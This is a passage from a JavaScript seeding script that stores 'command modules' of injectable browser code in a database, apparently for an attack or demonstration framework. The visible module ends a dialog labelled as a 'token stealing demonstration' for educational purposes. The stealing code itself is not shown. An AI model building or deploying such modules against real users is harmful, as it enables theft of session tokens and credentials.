              footer.style.color = '#999';
              footer.style.marginTop = '20px';
              footer.style.textAlign = 'center';
              footer.textContent = 'For educational purposes only.';
              dialogBox.appendChild(footer);
              
              overlay.appendChild(dialogBox);
              document.body.appendChild(overlay);
              
              closeBtn.addEventListener('click', function() {
                document.body.removeChild(overlay);
              });
              
              return { success: true, message: 'Token stealing demonstration activated' };
            })();
          `
        }
      ];
      
      // Insert the default modules
      for (const module of defaultModules) {
        await db.insert(commandModules).values(module);
      }
      
      console.log(`Initialized ${defaultModules.length} default command modules`);
    } else {
      console.log(`Found ${existingModules.length} existing command modules, skipping initialization`);
    }
  } catch (error) {
    console.error('Failed to initialize default command modules:', error);
    throw error;
  }
}

// Run the schema push
pushSchema().catch(error => {
  console.error('Schema push failed:', error);
  process.exit(1);
});